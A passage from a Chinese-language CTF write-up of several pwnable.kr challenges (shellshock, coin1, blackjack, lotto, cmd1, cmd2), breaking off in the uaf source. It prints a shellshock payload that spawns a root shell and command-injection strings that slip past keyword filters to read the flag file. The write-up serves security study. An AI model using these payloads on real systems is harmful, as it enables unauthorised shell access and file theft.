class="line"></span><br></pre></td></tr></table></figure><p>很简单的shellshock漏洞的利用，网上有很多payload，在bash输入以下payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> gu=<span class="string">&#x27;() &#123; :;&#125;;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><p>然后执行shellshock程序，就可以拿到一个root的shell，直接读flag即可。</p><h1 id="coin1-6-pt"><a href="#coin1-6-pt" class="headerlink" title="coin1 (6 pt)"></a>coin1 (6 pt)</h1><p>这是一个编程题，没给源码，没给程序，是一个算法题。题目会给一定数量(N)的金币，每个金币的重量为10，但是其中有一个假金币，假金币的重量为9，题目会给一定的称重次数(C)，每次可以选择不同序号的金币称重获得总重量，在称重次数用完以后就需要给出假金币的序号，在一分钟内一共猜中100次假金币的序号才会给flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">---------------------------------------------------</span><br><span class="line">-              Shall we play a game?              -</span><br><span class="line">---------------------------------------------------</span><br><span class="line"></span><br><span class="line">You have given some gold coins in your hand</span><br><span class="line">however, there is one counterfeit coin among them</span><br><span class="line">counterfeit coin looks exactly same as real coin</span><br><span class="line">however, its weight is different from real one</span><br><span class="line">real coin weighs 10, counterfeit coin weighes 9</span><br><span class="line">help me to find the counterfeit coin with a scale</span><br><span class="line">if you find 100 counterfeit coins, you will get reward :)</span><br><span class="line">FYI, you have 60 seconds.</span><br><span class="line"></span><br><span class="line">- How to play -</span><br><span class="line">1. you get a number of coins (N) and number of chances (C)</span><br><span class="line">2. then you specify a set of index numbers of coins to be weighed</span><br><span class="line">3. you get the weight information</span><br><span class="line">4. 2~3 repeats C time, then you give the answer</span><br><span class="line"></span><br><span class="line">- Example -</span><br><span class="line">[Server] N&#x3D;4 C&#x3D;2 # find counterfeit among 4 coins with 2 trial</span><br><span class="line">[Client] 0 1 # weigh first and second coin</span><br><span class="line">[Server] 20# scale result : 20</span><br><span class="line">[Client] 3# weigh fourth coin</span><br><span class="line">[Server] 10# scale result : 10</span><br><span class="line">[Client] 2 # counterfeit coin is third!</span><br><span class="line">[Server] Correct!</span><br><span class="line"></span><br><span class="line">- Ready? starting in 3 sec... -</span><br></pre></td></tr></table></figure><p>这种类型的题目可以用二分法来解，对二分法来说，题目给的称重次数是肯定够用的，先称左半部分，重量是否是预期的重量（即总重量=数量*10），否则假金币就在右半部分，以此类推直到最后只剩下一个金币。</p><p>最终的exp如下，由于远程连接比较慢，一分钟只能跑20多次，所以需要上传到服务器去跑，随便找个以前的题目，去tmp目录下跑就可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">HOST = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">PORT = <span class="number">9007</span></span><br><span class="line"></span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">conn = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">start, end</span>):</span></span><br><span class="line">    rg = [str(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(start, end)]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> rg:</span><br><span class="line">        rg = [str(start)]</span><br><span class="line">    conn.sendline(<span class="string">&#x27; &#x27;</span>.join(rg))</span><br><span class="line">    result = int(conn.recvline()[:<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError()</span><br><span class="line">    <span class="keyword">return</span> result != len(rg) * <span class="number">10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">&#x27;N=&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    conn.recvuntil(<span class="string">&#x27;N=&#x27;</span>)</span><br><span class="line">    line = conn.recvline()</span><br><span class="line">    t = line.split()</span><br><span class="line">    N = int(t[<span class="number">0</span>])</span><br><span class="line">    C = int(t[<span class="number">1</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    log.info(<span class="string">&#x27;N=%d C=%d&#x27;</span> % (N, C))</span><br><span class="line"></span><br><span class="line">    left, right = <span class="number">0</span>, N</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(C):</span><br><span class="line">        mid = (right + left) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># log.info(&#x27;Count: %d/%d&#x27; % (i+1, C))</span></span><br><span class="line">        <span class="comment"># log.info(&#x27;%d %d %d&#x27; % (left, mid, right))</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> send(left, mid):</span><br><span class="line">                <span class="comment"># Coin in here.</span></span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="comment"># Find it.</span></span><br><span class="line">            <span class="comment"># log.info(&#x27;Find %d&#x27; % left)</span></span><br><span class="line">            l = C-i<span class="number">-1</span></span><br><span class="line">            <span class="keyword">if</span> l &lt; <span class="number">0</span>:</span><br><span class="line">                log.error(<span class="string">&#x27;Not enough count!&#x27;</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(l):</span><br><span class="line">                send(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">            conn.sendline(str(left))</span><br><span class="line">            ret = conn.recvline()</span><br><span class="line">            <span class="keyword">assert</span> <span class="string">&#x27;Correct&#x27;</span> <span class="keyword">in</span> ret</span><br><span class="line">            log.success(ret)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># log.info(&#x27;Find %d&#x27; % mid)</span></span><br><span class="line">        conn.sendline(str(mid))</span><br><span class="line">        ret = conn.recvline()</span><br><span class="line">        <span class="keyword">assert</span> <span class="string">&#x27;Correct&#x27;</span> <span class="keyword">in</span> ret</span><br><span class="line">        log.success(ret)</span><br><span class="line"></span><br><span class="line">log.success(conn.recvline())</span><br><span class="line">log.success(conn.recvline())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="blackjack-1-pt"><a href="#blackjack-1-pt" class="headerlink" title="blackjack (1 pt)"></a>blackjack (1 pt)</h1><p>和上一题一样，没给源码没给程序，看规则应该是一个类似21点的游戏，游戏开始只有500$，可以下赌注，如果点数超过21点就输了，目标是获得1000,000$。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">           RULES of VLAD&#39;s BLACKJACK</span><br><span class="line">          ---------------------------</span><br><span class="line">I.</span><br><span class="line">     Thou shalt not question the odds of this game.</span><br><span class="line">      S This program generates cards at random.</span><br><span class="line">      D If you keep losing, you are very unlucky!</span><br><span class="line"></span><br><span class="line">II.</span><br><span class="line">     Each card has a value.</span><br><span class="line">      S Number cards 1 to 10 hold a value of their number.</span><br><span class="line">      D J, Q, and K cards hold a value of 10.</span><br><span class="line">      C Ace cards hold a value of 11</span><br><span class="line">     The goal of this game is to reach a card value total of 21.</span><br><span class="line"></span><br><span class="line">III.</span><br><span class="line">     After the dealing of the first two cards, YOU must decide whether to HIT or STAY.</span><br><span class="line">      S Staying will keep you safe, hitting will add a card.</span><br><span class="line">     Because you are competing against the dealer, you must beat his hand.</span><br><span class="line">     BUT BEWARE!.</span><br><span class="line">      D If your total goes over 21, you will LOSE!.</span><br><span class="line">     But the world is not over, because you can always play again.</span><br><span class="line"></span><br><span class="line">SHC YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM CHS</span><br><span class="line"></span><br><span class="line">Would you like to go the previous screen? (I will not take NO for an answer)</span><br><span class="line">                  (Y&#x2F;N)</span><br><span class="line">                    </span><br></pre></td></tr></table></figure><p>其实看了半天也没太看懂算分的规则，但是不重要。首先需要输入你的赌注，赌注可以输入负数，所以只要玩输了就会赚，不知道为什么， 有时候赌注输入的负数太大了（没有溢出）最后就说我破产了，所以一点点十几万的往上加赌注，一直输，知道赢了100万就拿到flag了。</p><h1 id="lotto-2-pt"><a href="#lotto-2-pt" class="headerlink" title="lotto (2 pt)"></a>lotto (2 pt)</h1><p>这次的题目也是个 游戏，给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Submit your 6 lotto bytes : &quot;</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line">r = read(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Lotto Start!\n&quot;</span>);</span><br><span class="line"><span class="comment">//sleep(1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// generate lotto numbers</span></span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error2. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;<span class="comment">// 1 ~ 45</span></span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// calculate lotto score</span></span><br><span class="line"><span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">match++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// win!</span></span><br><span class="line"><span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bad luck...\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- nLotto Rule -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;nlotto is consisted with 6 random natural numbers less than 46\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;your goal is to match lotto numbers as many as you can\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;if you win lottery for *1st place*, you will get reward\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;for more details, follow the link below\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;mathematical chance to win this game is known to be 1/8145060.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// menu</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- Select Menu -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1. Play Lotto\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2. Help\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3. Exit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;menu);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(menu)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">play();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">help();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bye\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;invalid menu\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是一个被称为lotto的游戏，也就是猜数字，说白了就是刮彩票，程序会通过<code>/dev/urandom</code>生成6个1-45之间的随机数，我们需要输入6个数字，保证我们输入的6个数字在生成的6个随机数中只出现一次，我们就赢了，所以最后的这两层循环就变得容易了起来，我们可以只输入6个相同的数字，只要这个数字命中了随机数中的任意一个，最后match的结果有很大的可能性是6，例如一直输入六个字符<code>-</code>，也就是数字45，只尝试了4次就成功了。</p><h1 id="cmd1-1-pt"><a href="#cmd1-1-pt" class="headerlink" title="cmd1 (1 pt)"></a>cmd1 (1 pt)</h1><p>非常简单的一道题，直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;sh&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;tmp&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">putenv(<span class="string">&quot;PATH=/thankyouverymuch&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">system( argv[<span class="number">1</span>] );</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接给了一个shell，但是去除了PATH环境变量，并且输入的command中不能出现flag，sh，tmp这些字符串。去除了环境变量我们就可以用cat的绝对路径，不能出现flag可以用通配符代替，最后的payload如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cmd1 <span class="string">&quot;/bin/cat ./fl*&quot;</span></span><br></pre></td></tr></table></figure><h1 id="cmd2-9-pt"><a href="#cmd2-9-pt" class="headerlink" title="cmd2 (9 pt)"></a>cmd2 (9 pt)</h1><p>和上一题类似，直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;=&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;PATH&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;export&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;/&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;`&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span>** p;</span><br><span class="line"><span class="keyword">for</span>(p=environ; *p; p++)<span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">delete_env();</span><br><span class="line">putenv(<span class="string">&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">system( argv[<span class="number">1</span>] );</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目增加了更多的限制，并且删除了所有环节变量。最大的限制就是不能出现路径分隔符，因此无法用绝对路径来使用cat，但是可以用shell变量来造一个路径分隔符，例如<code>echo $(pwd)</code>，如果此时位于根目录的时候，<code>$(pwd)</code>就会返回<code>/</code>，所以可以利用这个payload构造一个路径分隔符。</p><p>最后在bash里输入如下payload，需要注意的是<code>$(pwd)</code>需要被传到system里，因此在bash里需要加上转义，否则在执行cmd2之前<code>$(pwd)</code>就会被bash解析为<code>/</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line">~/cmd2 <span class="string">&quot;\$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)fla*&quot;</span></span><br></pre></td></tr></table></figure><h1 id="uaf-8-pt"><a href="#uaf-8-pt" class="headerlink" title="uaf (8 pt)"></a>uaf (8 pt)</h1><p>直接给了源码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 